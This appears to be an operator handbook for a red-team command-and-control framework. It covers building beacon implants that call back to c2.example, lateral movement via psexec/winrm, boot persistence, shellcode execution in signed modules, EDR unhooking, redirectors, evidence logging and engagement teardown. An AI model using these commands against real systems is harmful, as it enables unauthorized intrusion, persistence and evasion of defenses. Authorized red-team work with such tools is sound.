# Operator handbook

A short path from a fresh clone to a cleaned-up engagement.

## 1. Server

```bash
python3 -m tornadoc2.team.server --help
```

The server keeps state under `logs/`, `team_ca/`, `tls_certs/` and
`mtls_certs/`. Protect the machine: the CA signs every operator
certificate, and `logs/at_rest.key` decrypts credentials.

First run:

1. Start the server in local mode.
2. `operators add <name> operator` (or `admin` from the local console).
3. Hand the operator their `.cfg` and certificate out of band.
4. Create a TLS HTTP listener — Jump and stagers require TLS.

Back up with `scripts/backup.sh`; restore with
`scripts/restore.sh <archive>` and verify the checksum.

## 2. Build

Prefer `tags` over individual flags for exotic combinations:

```bash
beacon-build --os windows --format exe --transport http \
  --url https://c2.example --wasm-extensions --jump psexec,winrm
```

An HTTP-only build links no DNS, QUIC, WebSocket, WireGuard or WASM
code. `--tags all` restores everything. Every tag is documented in
`README.md`.

## 3. Sessions

- `beacons` / `use <id>` / `info` — select and inspect.
- `jump <method> <host>` — push a fresh stager to a new host over a
  running TLS listener. Add `--user/--pass` for another identity and
  leave cleanup on unless the service must survive.
- `persist add <method> <name>` — boot persistence. Linux:
  `systemd|cron|profile`; Windows: `registry|task|service`.
- `update publish <build_id>` or `update <url> <sha256> <sig>` —
  verify and swap the binary, `.old` kept.
- Stack spoofing is on by default for Windows builds; turn it off
  with `stack_spoof: false` if a target misbehaves.
- `fork [--parent]` — second beacon; `stomp <b64>` — run shellcode in a signed
  module (`--restore`, `--pe`, `--bof`). `unhook` / `unhook revert`.
- `privesc caps|suid|sudo|ptrace|container` — read-only privilege
  reconnaissance.
- `armory install <name>` — operator-local BOFs; `bof <name>` runs
  one. The source is locked to the project armory repository; see
  [`armory-contract.md`](armory-contract.md).
- HTTP requests are not printed to the terminal. They stream to the
  desktop Events pane (`server/http`); daemon lifecycle output stays
  in `logs/console.log`.
- `operator add` writes the new operator's config automatically with
  `0600` and prints its path, digest and fingerprints. Use
  `operator export <name> --print` only when the PEM body is needed.

## 4. Evidence

- `findings <severity> <host> <title> <detail>` records a finding.
- `timeline <kind> <text>` records an event; listener creation and
  Jump staging are recorded automatically.
- `evidence <sha256> <name> <host> [detail]` records a hash;
  `evidence --loot <digest>` links one from the loot store.
- `findings <sev> <host> <title> <detail> --ev <sha>` links evidence.
- `export ioc|stix|mitre|report [path]` writes the deliverable
  (`0600` when a path is given).
- `bulk task <ids> <verb>`, `bulk tag|untag <tag> <ids>`,
  `bulk kill <ids>` apply to many beacons, audited per beacon.
- `report`/`export report` include a dataset hash and an optional fixed
  timestamp.

## 5. Teardown

1. `persist remove <name>` on every persisted host.
2. `jump … --no-cleanup` hosts: remove the service and payload.
3. `killall --all` (or `kill <id>`), then stop listeners.
4. `scripts/backup.sh` and archive the report.

## Redirectors and health

`scripts/redirector.py --kind nginx --tls passthrough --host c2.example
--upstream https://10.0.0.5:443` prints a config with an SNI allowlist;
`--tls terminate` needs `--cert/--key` and adds a 421 default server.
`--check` validates when `nginx`/`caddy` is installed.

`listeners health` shows `state`, `cert_days_left` and recent probe
errors; `listeners health --probe <id>` forces a probe (manage
capability). Three failures mark a listener `down` and fire the
`listener-health` webhook.

## GUI

`--gui --safe` starts without restoring the workspace or timers.
Layout, filter, theme and keybindings persist under
`client/.tornadoc2/gui-state.json`; **Edit → Keybindings…** rebinds
the main shortcuts with duplicate detection. Selecting two or more
beacons raises the bulk bar (task, tag, kill).

## Troubleshooting

| Symptom | Cause |
|---|---|
| `[...] password_required` | The operator has a password; set it in the client prompt. |
| `[locked]` | 5 bad passwords; wait 30 s or ask an admin to reset. |
| `jump needs a TLS HTTP listener` | Create/start a TLS listener, or select one with `--listener`. |
| `jump <method> is not compiled into this agent` | Rebuild with the matching `jump_*` tag. |
| `persistence is not compiled into this agent` | Rebuild with a `persist_*` tag. |
| `armory index unusable` | Refresh failed. Check network/TLS; the last good index is used if one exists. |
| `at_rest.key` missing after restore | Restore the key too; without it encrypted state cannot be read. |
